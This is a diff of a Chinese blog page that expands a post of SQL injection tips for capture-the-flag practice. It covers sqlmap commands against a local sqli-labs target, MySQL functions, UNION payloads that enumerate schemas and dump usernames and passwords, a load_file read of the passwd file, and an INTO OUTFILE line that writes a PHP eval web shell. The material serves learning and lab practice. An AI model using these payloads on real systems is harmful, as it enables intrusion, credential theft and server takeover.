@@ -5,11 +5,13 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="sql注入的一些tip, 书鱼">
-    <meta name="description" content="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句show databases;         //查看数据库
+    <meta name="description" content="一:基础语句show databases;         //查看数据库
 
 use xxx;                //使用某个数据库
 
-show tables;    ">
+show tables;            //查看该数据库的数据表
+
+desc xxx">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -391,14 +393,14 @@ show tables;    ">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    247
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 				
@@ -414,7 +416,7 @@ show tables;    ">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"><a href="#sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧" class="headerlink" title="sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧"></a>sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧</h3><h4 id="tips-基础语句"><a href="#tips-基础语句" class="headerlink" title="tips:基础语句"></a>tips:基础语句</h4><pre class=" language-mysql"><code class="language-mysql">show databases;         //查看数据库
+                <h4 id="一-基础语句"><a href="#一-基础语句" class="headerlink" title="一:基础语句"></a>一:基础语句</h4><pre class=" language-mysql"><code class="language-mysql">show databases;         //查看数据库
 
 use xxx;                //使用某个数据库
 
@@ -440,9 +442,96 @@ ascii()         //将某个字符转换成ascii码
 
 ord()           //将某个字符转换成ascii码，同ascii()
 
-select database() //当前数据库</code></pre>
+select database() //当前数据库
+
+concat()  //能将一些字符串连接一个字符串适用于一条数据
+
+group_concat() //能够将一张表的数据的一些数据分组合并起来，适用性比较广
+
+show @@basedir; //显示文件根目录
+
+select load_file('/ect/passwd'); //读文件 需要开secure-file-priv='/'
+
+select '<?php @eval($_post["mima"])?>' into outfile "位置" //写文件
+
+user(); //当前用户</code></pre>
 <a id="more"></a>
-<h4 id="一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#一、“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>一、“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h4><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre>
+<h3 id="二、sqlmap使用"><a href="#二、sqlmap使用" class="headerlink" title="二、sqlmap使用"></a>二、sqlmap使用</h3><p>github地址为<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a>，功能参考书<a href="https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap%E6%95%99%E7%A8%8B.pdf" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap教程.pdf</a></p>
+<h4 id="一些常用使用命令"><a href="#一些常用使用命令" class="headerlink" title="一些常用使用命令"></a>一些常用使用命令</h4><h5 id="1、是否能注入"><a href="#1、是否能注入" class="headerlink" title="1、是否能注入"></a>1、是否能注入</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;</code></pre><h5 id="2、获取所有的数据库"><a href="#2、获取所有的数据库" class="headerlink" title="2、获取所有的数据库"></a>2、获取所有的数据库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs</code></pre><h5 id="3、当前库"><a href="#3、当前库" class="headerlink" title="3、当前库"></a>3、当前库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db</code></pre><h5 id="4、查询某数据库的所有表（比如security）"><a href="#4、查询某数据库的所有表（比如security）" class="headerlink" title="4、查询某数据库的所有表（比如security）"></a>4、查询某数据库的所有表（比如security）</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;  -D security --tables</code></pre><h5 id="5、暴力查询所有的表"><a href="#5、暴力查询所有的表" class="headerlink" title="5、暴力查询所有的表"></a>5、暴力查询所有的表</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   --tables</code></pre><h5 id="6、列出security库中users表中的所有列"><a href="#6、列出security库中users表中的所有列" class="headerlink" title="6、列出security库中users表中的所有列"></a>6、列出security库中users表中的所有列</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users --columns</code></pre><p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p>
+<h5 id="7、导出三个数据列中所有的数据"><a href="#7、导出三个数据列中所有的数据" class="headerlink" title="7、导出三个数据列中所有的数据"></a>7、导出三个数据列中所有的数据</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users -C id,username,password --dump</code></pre><h5 id="8、提供一个sql-shell"><a href="#8、提供一个sql-shell" class="headerlink" title="8、提供一个sql shell"></a>8、提供一个sql shell</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell</code></pre><h3 id="三、遗漏知识点"><a href="#三、遗漏知识点" class="headerlink" title="三、遗漏知识点"></a>三、遗漏知识点</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
+<h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p>
+<pre><code>id=1%27--%20</code></pre><h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
+<h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p>
+<pre><code>SBUSTR(str,pos); </code></pre><p>就是从pos开始的位置，一直截取到最后。</p>
+<pre><code>SUBSTR(str,pos,len);</code></pre><p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p>
+<h4 id="4-2、ascii-ord-函数"><a href="#4-2、ascii-ord-函数" class="headerlink" title="4.2、ascii(),ord()函数"></a>4.2、ascii(),ord()函数</h4><p>ASCII(str1)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
+<pre><code>mysql&gt; select ascii(&quot;a&quot;);
++------------+
+| ascii(&quot;a&quot;) |
++------------+
+|         97 |
++------------+
+1 row in set (0.00 sec)</code></pre><p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p>
+<pre><code>mysql&gt; select ord(&quot;a&quot;);
++----------+
+| ord(&quot;a&quot;) |
++----------+
+|       97 |
++----------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><pre><code>LEFT(str,length);</code></pre><p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p>
+<pre><code>mysql&gt; select left(&quot;hello Kitty&quot;,5);
++-----------------------+
+| left(&quot;hello Kitty&quot;,5) |
++-----------------------+
+| hello                 |
++-----------------------+
+1 row in set (0.00 sec)</code></pre><p>与之类似的是right(str,length);</p>
+<pre><code>mysql&gt; select right(&quot;hello Kitty&quot;,5);
++------------------------+
+| right(&quot;hello Kitty&quot;,5) |
++------------------------+
+| Kitty                  |
++------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p>
+<pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39; |
++------------------------------+
+|                            0 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39; |
++------------------------------+
+|                            1 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><pre><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></pre><p>函数用于从文本字段中提取字符。</p>
+<pre><code>+----+--------------+---------------------------+-------+---------+
+| id | name         | url                       | alexa | country |
++----+--------------+---------------------------+-------+---------+
+| 1  | Google       | https://www.google.cm/    | 1     | USA     |
+| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
+| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
+| 4  | 微博          | http://weibo.com/         | 20    | CN      |
+| 5  | Facebook      | https://www.facebook.com/ | 3     | USA     |
+| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |
++----+---------------+---------------------------+-------+---------+</code></pre><pre><code>SELECT MID(name,1,4) AS ShortTitle
+FROM Websites;</code></pre><p>返回结果<br><img src="13.png" alt=""></p>
+<h4 id="4-6、if"><a href="#4-6、if" class="headerlink" title="4.6、if()"></a>4.6、if()</h4><p> 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p>
+<p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p>
+<pre><code>mysql&gt; select name,if(sex=0,&#39;女&#39;,&#39;男&#39;) as sex from student;
++-------+-----+
+| name  | sex |
++-------+-----+
+| name1 | 女  |
+| name2 | 女  |
+| name3 | 男  |
+| name4 | 女  |
++-------+-----+
+rows in set (0.00 sec)</code></pre><h3 id="五、题目经典payload"><a href="#五、题目经典payload" class="headerlink" title="五、题目经典payload"></a>五、题目经典payload</h3><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1&#39; union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h5 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h5><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre>
             </div>
             <hr/>
 
@@ -547,43 +636,35 @@ select database() //当前数据库</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/22/sql-zhu-ru-de-yi-xie-tip/">
+                <a href="/2019/12/03/php-zhong-shen-mi-de-md5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="sql注入的一些tip">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="php中佛系的md5和数组">
                         
-                        <span class="card-title">sql注入的一些tip</span>
+                        <span class="card-title">php中佛系的md5和数组</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            sql注入的题目感觉就是各种绕过，每次遇到还是记一下吧tips:基础语句show databases;         //查看数据库
-
-use xxx;                //使用某个数据库
-
-show tables;    
+                            1、MD5函数漏洞$_GET[&#39;name&#39;] != $_GET[&#39;password&#39;]
+MD5($_GET[&#39;name&#39;]) == MD5($_GET[&#39;password&#39;])
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-11-22
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-03
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            <a href="/categories/CTF/Web/" class="post-category">
+                            <a href="/categories/Web/" class="post-category">
                                     Web
                                 </a>
                             
@@ -591,12 +672,11 @@ show tables;
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sql/">
-                        <span class="chip bg-color">sql</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
@@ -799,7 +879,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">173.5k</span>&nbsp;字
+                class="white-color">146.1k</span>&nbsp;字
             
             
             
